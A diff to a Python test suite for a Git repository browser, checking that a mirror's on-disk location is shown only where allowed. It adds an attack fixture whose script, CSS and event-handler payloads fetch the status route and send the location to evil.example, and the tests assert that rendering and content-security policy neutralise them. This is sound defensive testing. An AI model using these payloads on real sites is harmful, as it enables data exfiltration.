@@ -16,6 +16,7 @@ from __future__ import annotations
 
 import asyncio
 import io
+import json
 import os
 import re
 import sys
@@ -35,7 +36,7 @@ from devtools import check_startup_scripts
 from metabrowser import server
 from metabrowser.cache.acquire import PublishedSource, acquire_source
 from metabrowser.cache.repository_store import open_revision
-from metabrowser.capabilities import get_capabilities
+from metabrowser.capabilities import get_capabilities, untrusted_shell_csp
 from metabrowser.cli.main import _app, _run_cli
 from metabrowser.errors import CLIError
 from metabrowser.git.process import GitUnavailableError
@@ -50,12 +51,14 @@ from metabrowser.source import (
     get_source_session,
     serve_subject_opener,
 )
+from tests.github_pull_fixture import allowlist_violations
 from tests.golden_harness import (
     block,
     check_golden,
     fix_clock,
     label_home,
     normalize_console,
+    origin_identity,
     pin_git_dates,
 )
 from tests.required_tools import needs_git, needs_node
@@ -99,8 +102,11 @@ class _Origin:
         return f"file://{self.path.resolve()}"
 
 
-def _origin(root: Path) -> _Origin:
-    """A bare origin whose ``topic`` has two commits and a small browsable tree."""
+def _origin(root: Path, extra: dict[str, str] | None = None) -> _Origin:
+    """A bare origin whose ``topic`` has two commits and a small browsable tree.
+
+    *extra* adds files to the second commit, by name.
+    """
 
     work = root / "work"
     work.mkdir(parents=True)
@@ -117,6 +123,8 @@ def _origin(root: Path) -> _Origin:
     _git(work, "commit", "-qm", "first")
     first = _rev(work)
     (work / "data.json").write_text('{"k": 1}\n', encoding="utf-8")
+    for name, body in (extra or {}).items():
+        (work / name).write_text(body, encoding="utf-8")
     (work / "README.md").write_text(
         "# Pinned\n\nSecond revision.\n\n![logo](images/logo.png)\n", encoding="utf-8"
     )
@@ -431,6 +439,8 @@ def test_setting_a_filesystem_root_replaces_a_served_pin(
         status = client.get("/api/source/status").json()
     assert status["subject"] == "attached_filesystem"
     assert status["pin"] is None
+    # A folder is no mirror: its name and path reach the page as they always did.
+    assert (status["name"], status["origin"], status["location"]) == (None, None, None)
     assert opened == []
 
 
@@ -447,13 +457,27 @@ def served(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Iterator[tuple[Te
         yield client, origin
 
 
-def test_the_shell_names_the_pinned_revision(served: tuple[TestClient, _Origin]) -> None:
+def test_the_shell_names_the_repository_and_its_pinned_revision(
+    served: tuple[TestClient, _Origin],
+) -> None:
     client, origin = served
     shell = client.get("/view/")
     assert shell.status_code == 200
-    assert f'data-served-root="{origin.second}"' in shell.text
-    assert '<span class="path-base">topic</span>' in shell.text
-    assert f'<span class="header-revision">{origin.second[:12]}</span>' in shell.text
+    # The root is the repository's name, as a checkout of ``origin.git`` would be
+    # called, in the heading and as what the file header's prefix reads back. It was
+    # the full commit ID (mb-fndz).
+    assert 'data-served-root="origin"' in shell.text
+    assert '<span class="path-base">origin</span>' in shell.text
+    assert f'data-served-root="{origin.second}"' not in shell.text
+    # The ref and the short commit follow it, muted, each in its own element so a
+    # narrow column drops the ref first.
+    assert (
+        '<span class="path"><span class="path-base">origin</span></span>'
+        '<span class="header-revision header-ref">topic</span>'
+        f'<span class="header-revision">{origin.second[:12]}</span></a>'
+    ) in shell.text
+    # The tab is called what a folder's is: the page names the root in its headings.
+    assert "<title>Metabrowser</title>" in shell.text
     assert 'window.METABROWSER_SOURCE_KIND="git_revision"' in shell.text
     assert "window.METABROWSER_REPOSITORY_CONTEXT=null" in shell.text
     # The GitPath codec is a startup script here, ahead of the navigation module that
@@ -466,6 +490,164 @@ def test_the_shell_names_the_pinned_revision(served: tuple[TestClient, _Origin])
     assert client.get(f"/view/{_wire('README.md')}").status_code == 200
     assert client.get("/view/README.md").status_code == 400
     assert client.get(f"/commit/{origin.first}").status_code == 200
+
+
+def test_the_status_and_the_page_say_where_the_mirror_is_kept(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """A served mirror names its location, with the home directory as ``~`` (mb-fndz).
+
+    The location is the store's bare repository, the directory Git reads every page
+    from, and the sentence around it says so: a mirror has no checked-out folder. The
+    status reports it as data and the page's heading carries the same text, for the
+    file header to read back as it reads the served root.
+    """
+
+    origin = _origin(tmp_path)
+    user = tmp_path / "user"
+    user.mkdir()
+    home = user / ".metabrowser"
+    monkeypatch.setenv("HOME", str(user))
+    monkeypatch.setenv("METABROWSER_HOME", str(home))
+    _allow_installed_git(monkeypatch)
+    result = _serve(origin.url)
+    assert result.exit_code == 0, result.output
+
+    (store,) = (home / "cache" / "repository-stores").iterdir()
+    location = f"~/.metabrowser/cache/repository-stores/{store.name}/repository.git"
+    # It is what it is said to be: a bare repository, with the pinned commit in it.
+    assert (store / "repository.git" / "HEAD").is_file()
+    assert not (store / "repository.git" / ".git").exists()
+
+    def tip(commit: str) -> str:
+        return (
+            f"Mirror of {origin.url} at {commit}, stored in {location}: "
+            "a bare Git repository, with no checked-out files."
+        )
+
+    with TestClient(server.app) as client:
+        status = client.get("/api/source/status").json()
+        assert status["name"] == "origin"
+        assert status["origin"] == origin.url
+        assert status["location"] == location
+
+        shell = client.get(f"/view/{_wire('README.md')}").text
+        assert (
+            f'data-served-root="origin" data-mirror-location="{location}" '
+            f'data-mirror-tip="{tip(origin.second)}">'
+        ) in shell
+        # Abbreviated wherever it stands: the home directory is spelled out nowhere.
+        assert str(user) not in shell
+        assert str(user) not in json.dumps(status)
+
+        # Another commit of the same repository is the same mirror in the same place,
+        # and the sentence names the commit now served.
+        switched = client.post("/api/source/pin", json={"oid": origin.first})
+        assert switched.status_code == 200, switched.text
+        assert switched.json()["status"]["location"] == location
+        assert switched.json()["status"]["name"] == "origin"
+        assert f'data-mirror-tip="{tip(origin.first)}">' in client.get("/view/").text
+
+
+# A document that tries each way a repository's author could read the heading: run
+# script, select the heading from a stylesheet and report the match to another host, ask
+# the status route for an image or through a frame, and label itself as the heading.
+_READS_THE_LOCATION = """# Attack
+
+<script>fetch("/api/source/status").then((r) => r.json()).then((s) => {
+  location = "https://evil.example/?" + encodeURIComponent(s.location);
+});</script>
+
+<style>.header-path[data-mirror-location^="/"] { background: url(https://evil.example/a) }</style>
+
+<link rel="stylesheet" href="attack.css">
+
+<p class="header-path" data-mirror-location="x" style="background: url(https://evil.example/b)"
+   onmouseover="fetch('/api/source/status')">hover</p>
+
+<img src="/api/source/status" alt="status">
+
+<iframe src="/api/source/status"></iframe>
+
+[status](/api/source/status)
+"""
+_ATTACK_PAGE = '<!doctype html><script>fetch("/api/source/status")</script><p>page</p>\n'
+
+
+def test_repository_content_cannot_read_where_the_mirror_is_kept(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """The location is on the application page, and a mirror's content is not (mb-fndz).
+
+    Cache paths were kept out of every answer because a served mirror is untrusted. The
+    location is now shown, so this holds the reason it is still safe: for a repository's
+    author to read it, their content would have to run script in the application's
+    origin, or style the application page and report what a selector matched. A
+    document that tries both renders as plain markup; the page's policy leaves nowhere
+    to report to; and the same file opened raw is a sandbox the status route refuses.
+    """
+
+    _home(tmp_path, monkeypatch)
+    origin = _origin(tmp_path, {"ATTACK.md": _READS_THE_LOCATION, "attack.html": _ATTACK_PAGE})
+    result = _serve(origin.url)
+    assert result.exit_code == 0, result.output
+
+    with TestClient(server.app) as client:
+        location = client.get("/api/source/status").json()["location"]
+        assert location and str(tmp_path) in location
+
+        rendered = client.get(
+            "/api/kpress/render", params={"path": _wire("ATTACK.md"), "view": "document"}
+        ).json()
+        assert rendered["inert"] is True
+        html = rendered["html"]
+        assert allowlist_violations(html, images=True) == []
+        for gone in (
+            "<script",
+            "<style",
+            "<link",
+            "<iframe",
+            "style=",
+            "class=",
+            "data-mirror",
+            "onmouseover",
+            "evil.example",
+            "/api/source/status",
+        ):
+            assert gone not in html, gone
+        # What is left is the document's words.
+        assert "hover" in html and "status" in html
+        loads = {asset["loading"] for asset in rendered["assets"]["assets"]}
+        assert loads <= {"stylesheet", "resource"}
+
+        # The page that carries the location runs this server's scripts only, takes no
+        # stylesheet from the tree, reaches no other host, and cannot be framed.
+        shell = client.get(f"/view/{_wire('ATTACK.md')}")
+        assert location in shell.text
+        policy = shell.headers["content-security-policy"]
+        nonce = re.search(r"'nonce-([^']+)'", policy)
+        assert nonce is not None
+        assert policy == untrusted_shell_csp(nonce.group(1), "http://testserver")
+        for directive in (
+            "img-src 'self' data:",
+            "connect-src 'self'",
+            "frame-src 'none'",
+            "frame-ancestors 'none'",
+        ):
+            assert directive in policy
+        assert "/raw" not in policy
+        assert "access-control-allow-origin" not in shell.headers
+
+        # The same content opened raw runs nothing, and its origin is refused the status.
+        raw = client.get("/raw", params={"path": _wire("attack.html")})
+        assert raw.status_code == 200
+        assert raw.headers["content-security-policy"] == _RAW_CSP_NO_SCRIPTS
+        assert location not in raw.text
+        for headers in ({"origin": "null"}, {"sec-fetch-site": "cross-site"}):
+            refused = client.get("/api/source/status", headers=headers)
+            assert refused.status_code == 403, headers
+            assert location not in refused.text
+            assert "access-control-allow-origin" not in refused.headers
 
 
 def test_a_served_pin_has_its_routes_before_its_first_request(
@@ -656,6 +838,39 @@ def _probe_urls(
     return urls
 
 
+# The routes that answer with the page, and the one that answers with the status.
+_PAGE_ROUTES = ("/view/{path:path}", "/commit/{rest:path}", "/pull/{rest:path}")
+_STATUS_ROUTE = "/api/source/status"
+
+
+def _without_what_a_mirror_may_name(
+    route: Route, response: Any, *, origin: str, location: str, commit: str
+) -> str:
+    """The answer's text without the mirror's origin and location, each checked in place.
+
+    A served mirror says where it is kept and what it mirrors (mb-fndz), and the rule
+    is exact about where: the status envelope's ``origin`` and ``location``, and the two
+    attributes of the page's navigation heading that carry the same text. Each is
+    checked to be exactly that text and then taken out, so whatever the caller finds in
+    what is left stands somewhere the rule does not allow. Every other route's answer
+    comes back whole.
+    """
+
+    text: str = response.text
+    if route.path == _STATUS_ROUTE and response.status_code == 200:
+        body = response.json()
+        assert (body.pop("origin"), body.pop("location")) == (origin, location)
+        return json.dumps(body)
+    if route.path in _PAGE_ROUTES and response.status_code == 200:
+        heading = (
+            f' data-mirror-location="{location}" data-mirror-tip="Mirror of {origin} at '
+            f'{commit}, stored in {location}: a bare Git repository, with no checked-out files."'
+        )
+        assert text.count(heading) == 1, route.path
+        return text.replace(heading, "")
+    return text
+
+
 def test_a_served_pin_reads_nothing_outside_its_own_store(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
@@ -666,6 +881,12 @@ def test_a_served_pin_reads_nothing_outside_its_own_store(
     GitPath wire, and for the other source's commit; no answer carries either canary.
     The cache records that name the other source are refused outright, and a request
     from the sandboxed preview origin cannot read ``/api`` at all.
+
+    No answer names the application home or the served origin either, with one
+    exception that is held to its exact form: the status envelope and the page's
+    heading say where the served mirror is kept and what it mirrors
+    (``_without_what_a_mirror_may_name``). A file's content, a listing, an error, and
+    every other envelope still name no path.
     """
 
     home = _home(tmp_path, monkeypatch)
@@ -689,10 +910,12 @@ def test_a_served_pin_reads_nothing_outside_its_own_store(
         for route in server.app.routes
         if isinstance(route, Route)
         and "GET" in (route.methods or set())
-        and route.path.startswith(("/api/", "/raw", "/view", "/commit", "/_debug"))
+        and route.path.startswith(("/api/", "/raw", "/view", "/commit", "/pull", "/_debug"))
     ]
     probed = [
-        url for route in routes for url in _probe_urls(route, probes, other.first, origin.second)
+        (route, url)
+        for route in routes
+        for url in _probe_urls(route, probes, other.first, origin.second)
     ]
     expected = {
         "/api/file",
@@ -702,8 +925,17 @@ def test_a_served_pin_reads_nothing_outside_its_own_store(
         "/api/git/commit/{revision}",
         "/api/plugin/diff/comparison",
         "/_debug/inventory",
+        _STATUS_ROUTE,
+        *_PAGE_ROUTES,
     }
     assert expected <= {route.path for route in routes}
+    # The served store's bare repository, from the origin's address alone. The home is
+    # not under the user's home directory here, so the location is absolute and the
+    # sweep below would find the home in any answer that named it.
+    store_key = origin_identity(origin.url).store_id.removeprefix("sha256:")
+    location = str(home / "cache" / "repository-stores" / store_key / "repository.git")
+    assert Path(location, "HEAD").is_file()
+    named = 0
     with TestClient(server.app) as client:
         # The probe can see a leak: the pin's own content does come back.
         own = client.get("/api/file", params={"path": _wire("README.md")})
@@ -711,12 +943,19 @@ def test_a_served_pin_reads_nothing_outside_its_own_store(
         assert client.get(f"/api/git/commit/{other.first}").status_code == 404
         # The provider diagnostic has no provider to report on a pin.
         assert client.get("/_debug/inventory").json()["capability"] == "filesystem"
-        for url in probed:
+        for route, url in probed:
             response = client.get(url)
             assert _OTHER_SOURCE_CANARY not in response.text, url
             assert _WORKING_DIRECTORY_CANARY not in response.text, url
-            assert str(home) not in response.text, url
             assert str(other.path) not in response.text, url
+            rest = _without_what_a_mirror_may_name(
+                route, response, origin=origin.url, location=location, commit=origin.second
+            )
+            named += rest != response.text
+            assert str(home) not in rest, url
+            assert str(origin.path) not in rest, url
+        # The exception was met: the status and the page did name the location.
+        assert named >= 2
         # The one POST that reads content: KPress rendering, by path and by source.
         for probe in probes:
             rendered = client.post("/api/kpress/render", json={"path": probe, "view": "document"})
